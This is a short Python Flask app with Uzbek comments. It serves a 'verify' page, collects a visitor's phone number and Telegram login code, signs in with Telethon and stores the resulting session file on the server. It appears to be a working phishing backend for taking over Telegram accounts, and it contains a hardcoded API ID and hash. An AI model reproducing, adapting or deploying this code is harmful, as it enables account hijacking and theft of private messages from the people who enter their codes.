import os
import asyncio
from flask import Flask, request, render_template
from telethon import TelegramClient

app = Flask(__name__)

# Sizning API ma'lumotlaringiz
API_ID = 26543168 
API_HASH = '8f34586d061f185c635677c3e53f19f2'
SESSION_DIR = './sessions'

if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

storage = {}

@app.route('/')
def index():
    return render_template('verify.html', step=1)

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone').replace(' ', '').replace('-', '')
    if not phone.startswith('+'): phone = '+' + phone

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    # Render-da proxy kerak emas, Telegram ochiq ishlaydi
    client = TelegramClient(os.path.join(SESSION_DIR, phone), API_ID, API_HASH, loop=loop)
    
    try:
        loop.run_until_complete(client.connect())
        sent = loop.run_until_complete(client.send_code_request(phone))
        storage[phone] = {'hash': sent.phone_code_hash, 'client': client, 'loop': loop}
        return render_template('verify.html', step=2, phone=phone)
    except Exception as e:
        return f"Ulanish xatosi: {str(e)}"

@app.route('/verify', methods=['POST'])
def verify():
    phone = request.form.get('phone')
    code = request.form.get('code')
    data = storage.get(phone)
    
    if not data: return "Sessiya topilmadi."

    client, p_hash, loop = data['client'], data['hash'], data['loop']
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(client.sign_in(phone, code, phone_code_hash=p_hash))
        return "✅ Muvaffaqiyatli! Sessiya yaratildi."
    except Exception as e:
        return f"Xato: {str(e)}"

if __name__ == "__main__":
    # Render uchun eng muhim qism: PORTni dinamik aniqlash
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
